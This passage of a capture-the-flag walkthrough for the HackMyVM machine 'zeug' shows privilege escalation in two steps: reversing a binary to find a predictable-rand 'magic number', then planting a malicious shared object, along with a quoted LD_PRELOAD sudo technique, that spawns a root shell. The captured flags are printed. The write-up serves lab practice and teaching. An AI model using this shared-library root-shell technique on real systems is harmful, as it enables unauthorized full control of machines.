HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

`cd /home/cosette`

`ls -alps ./`:
```
total 44
 4 drwx------ 4 cosette cosette  4096 Jan  7  2024 ./
 4 drwxr-xr-x 4 root    root     4096 Jan  6  2024 ../
 0 lrwxrwxrwx 1 cosette cosette     9 Jan  6  2024 .bash_history -> /dev/null
 4 -rwx------ 1 cosette cosette   220 Apr 23  2023 .bash_logout
 4 -rwx------ 1 cosette cosette  3526 Apr 23  2023 .bashrc
 4 drwx------ 3 cosette cosette  4096 Jan  6  2024 .local/
 4 -rwx------ 1 cosette cosette   807 Apr 23  2023 .profile
16 -rwx------ 1 cosette cosette 15744 Jan  7  2024 seed_bak ←
 4 drwx------ 6 cosette cosette  4096 Oct 18 05:57 zeug/
```

`sudo -l`:
```
Matching Defaults entries for cosette on zeug:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cosette may run the following commands on zeug:
    (exia) NOPASSWD: /home/exia/seed ←
```

`./seed_bak`:
```
********************************************
* Hi, Cosette, it's time to plant the seed *
********************************************
Enter a number: 15
Wrong.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`download /home/cosette/seed_bak /home/kali/seed_bak`:
```
/home/cosette/seed_bak ━━━━━━━━━━━━━━━━━━━━ 100.0% • 15.7/15.7 KB • ? • 0:00:00
[14:20:09] downloaded 15.74KiB in 0.78 seconds
```

`cd /home/kali`

`file ./seed_bak`:
```
./seed_bak: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=403ea35a235b0a4c74f7977580b4ef46fcd0f044, for GNU/Linux 4.4.0, not stripped
```

`ghidra` > `Import File: ./seed_bak`:
```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  banner();
  srand(1);
  local_18 = rand();
  local_14 = 0xdeadbeef;
  local_1c = 0;
  printf("Enter a number: ");
  __isoc99_scanf(&DAT_00102076,&local_1c);
  if (local_14 == (local_1c ^ local_18)) {
    system("/bin/bash");
  }
  else {
    puts("Wrong.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

`vim ./find_wanted_number.c`:
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	srand(1);
	unsigned int unrandom_value = rand();
	printf("Unrandom value: %u\n", unrandom_value);
	unsigned int deadbeef = 0xdeadbeef;	
	unsigned int wanted_number = unrandom_value ^ deadbeef;
	printf("Wanted number: %u\n", wanted_number);
	return 0;
}
```

`gcc ./find_wanted_number.c -o find_wanted_number`

`./find_wanted_number`:
```
Unrandom value: 1804289383
Wanted number: 3039230856 ←
```

![Victim: cosette](https://img.shields.io/badge/Victim-cosette-64b5f6?logo=linux&logoColor=white)

`sudo -u exia /home/exia/seed`:
```
********************************************
* Hi, Cosette, it's time to plant the seed *
********************************************
Enter a number: 3039230856 ←
```

![Victim: exia](https://img.shields.io/badge/Victim-exia-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
exia ←
```

`id`:
```
uid=1002(exia) gid=1002(exia) groups=1002(exia)
```

`cd /home/exia`

`ls -alps ./`:
```
total 44
 4 drwx------ 3 exia exia  4096 Jan  6  2024 ./
 4 drwxr-xr-x 4 root root  4096 Jan  6  2024 ../
 0 lrwxrwxrwx 1 exia exia     9 Jan  6  2024 .bash_history -> /dev/null
 4 -rwx------ 1 exia exia   220 Apr 23  2023 .bash_logout
 4 -rwx------ 1 exia exia  3526 Apr 23  2023 .bashrc
 4 drwx------ 3 exia exia  4096 Jan  6  2024 .local/
 4 -rwx------ 1 exia exia   807 Apr 23  2023 .profile
16 -rwx------ 1 exia exia 15744 Jan  6  2024 seed
 4 -rwx------ 1 exia exia    38 Jan  6  2024 user.txt ←
```

`cat ./user.txt`:
```
HMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}
```

`sudo -l`:
```
Matching Defaults entries for exia on zeug:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User exia may run the following commands on zeug:
    (root) NOPASSWD: /usr/bin/zeug ←
```

`ls -l /usr/bin/zeug`:
```
-rwxr-xr-x 1 root root 16048 Jan  6  2024 /usr/bin/zeug ←
```

`/usr/bin/zeug`:
```
Error opening file
```

`cp /usr/bin/zeug ./`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`download /home/exia/zeug /home/kali/zeug`:
```
/home/exia/zeug ━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 16.0/16.0 KB • ? • 0:00:00
[15:34:52] downloaded 16.05KiB in 0.07 seconds
```

`cd /home/kali`

`file ./zeug`:
```
./zeug: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=98720581ef7b2c988cb9f8a243a7dfb507529b15, for GNU/Linux 3.2.0, not stripped
```

`ghidra` > `Import File: ./zeug`:
```c
bool main(void)

{
  long lVar1;
  
  lVar1 = dlopen("/home/exia/exia.so",2);
  if (lVar1 == 0) {
    fwrite("Error opening file\n",1,0x13,stderr);
  }
  return lVar1 == 0;
}
```

<div>
	<img src="./assets/logo_exploit-notes.png" alt="Exploit Notes Logo" width="16" height="auto">
	<span style="#963bc2: white; font-size: 110%;"><strong>Exploit Notes</strong></span>
</div>

[Sudo Privilege Escalation by Overriding Shared Library](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/)

[**#Investigation**]

Check sudo commands.
```sh
sudo -l
```

The below is the output example.
```bash
env_keep+=LD_PRELOAD

(ALL : ALL) NOPASSWD: somecmd
```

If we find the `sudo` command keeps **LD_PRELOAD** environment, we can overwrite this variable to load our custom shared object and escalate the privileges.

Also, we can replace the **LD_PRELOAD** with **LD_LIBRARY_PATH**.

By the way, to list shared libraries required by the executable, use `ldd` command.
```sh
ldd somecmd
```

[**#Exploitation**]

First off, create **exploit.c** under **/tmp** .
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```
The **"constructor"** attribute is a special type of function attribute in GCC. It tells the compiler to automatically call the function before the main function.

Now compile the c program to shared object.
```bash
# -fPIC: Generate Position Independent Code.
# -shared: Generate a shared library.
# -o: Output shared object.
gcc  -fPIC -shared -o exploit.so exploit.c
```

We can execute command with setting the shared library to **LD_PRELOAD** variable then spawn the root shell.
```bash
sudo LD_PRELOAD=/tmp/exploit.so somecmd
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./privesc.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Define a function `inject` that will run before the main() function due to the constructor attribute.

void inject() __attribute__((constructor));
void inject() {
    // Remove the `LD_PRELOAD` environment variable. This variable is commonly used
    // to inject shared libraries into programs at runtime. By unsetting it,
    // the code ensures that no other libraries are injected or interfere with the program.
	unsetenv("LD_PRELOAD"); // In this case it is not even necessary
    
    // Set the user ID to 0 (root). This gives the current process root privileges.
	setuid(0);

    // Set the group ID to 0 (root group), granting the process root-level group privileges.
	setgid(0);

    // Execute the system command "/bin/bash", which opens an interactive Bash shell giving the user unrestricted access to the system.
	system("/bin/bash");
}
```

`gcc -fPIC -shared ./privesc.c -o ./exia.so`

`upload /home/kali/exia.so /home/exia/exia.so`:
```
/home/exia/exia.so ━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 15.5/15.5 KB • ? • 0:00:00
[15:47:30] uploaded 15.54KiB in 0.32 seconds
```

![Victim: exia](https://img.shields.io/badge/Victim-exia-64b5f6?logo=linux&logoColor=white)

`sudo /usr/bin/zeug`

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 32
4 drwx------  4 root root 4096 Jan  6  2024 ./
4 drwxr-xr-x 18 root root 4096 Jan  6  2024 ../
0 lrwxrwxrwx  1 root root    9 Jan  6  2024 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
4 -rw-------  1 root root   20 Jan  6  2024 .lesshst
4 drwxr-xr-x  3 root root 4096 Jan  6  2024 .local/
4 -rw-r--r--  1 root root  161 Jul  9  2019 .profile
0 -rw-------  1 root root    0 Jan  6  2024 .python_history
4 -rw-r--r--  1 root root   38 Jan  6  2024 root.txt ←
4 drwx------  2 root root 4096 Jan  6  2024 .ssh/
```

`cat ./root.txt`:
```
HMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq} ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
